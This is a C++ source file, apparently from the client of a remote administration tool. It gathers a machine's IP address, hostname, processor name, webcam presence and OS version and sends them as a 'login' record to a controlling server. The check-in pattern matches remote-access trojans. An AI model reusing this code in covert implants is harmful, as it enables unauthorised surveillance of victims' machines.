#include"Login.h"




int SendLoginInformation(_CIOCPClient* IOCPClient, DWORD WebSpeed)
{
	
	NTSTATUS Status;
	LOGIN_INFORMATION LoginInfo = { 0 };
	LoginInfo.IsToken = CLIENT_LOGIN;
	
	//获得当前客户端IP地址
	sockaddr_in ClientAddress;
	memset(&ClientAddress, 0, sizeof(sockaddr_in));
	int ClientAddressLength = sizeof(sockaddr_in);
	getsockname(IOCPClient->m_ClientSocket,
		(SOCKADDR*)&ClientAddress, &ClientAddressLength);
	LoginInfo.ClientAddress = ClientAddress.sin_addr;

	//获得当前客户端HostName
	gethostname(LoginInfo.HostName, MAX_PATH);

	//获得当前客户端的CPU信号
	ULONG ProcessNameStringLength = MAX_PATH;
	Status = GetProcessorNameString(LoginInfo.ProcessNameString,&ProcessNameStringLength);

	//判断当前客户端有无摄像头
	LoginInfo.IsWebCameraExist = IsWebCamera();

	//获得当前客户端系统版本信息
	LoginInfo.OsVersionInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO*)&LoginInfo.OsVersionInfoEx);
	int ReturnLength = 0;
	ReturnLength = IOCPClient->OnSending((char*)&LoginInfo, sizeof(LOGIN_INFORMATION));
	return ReturnLength;


}

NTSTATUS GetProcessorNameString(char* ProcessorNameString,ULONG* ProcessNameStringLength)
{
	
	HKEY KeyHandle;
	NTSTATUS Status;
	DWORD Type = REG_SZ;
	Status = RegOpenKey(HKEY_LOCAL_MACHINE,
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",&KeyHandle);
	if (Status!=ERROR_SUCCESS)
	{
		return Status;
	}
	Status = RegQueryValueEx(KeyHandle, "ProcessorNameString", NULL, &Type,
		(LPBYTE)ProcessorNameString, ProcessNameStringLength);
	RegCloseKey(KeyHandle);

	return Status;
}

BOOL IsWebCamera()
{
	
	BOOL IsOk = FALSE;
	CHAR v1[MAX_PATH];

	for (int i = 0; i < 10 &&!IsOk; i++)
	{
		IsOk = capGetDriverDescription(i, v1, sizeof(v1), NULL, 0);
	}
	return IsOk;
}
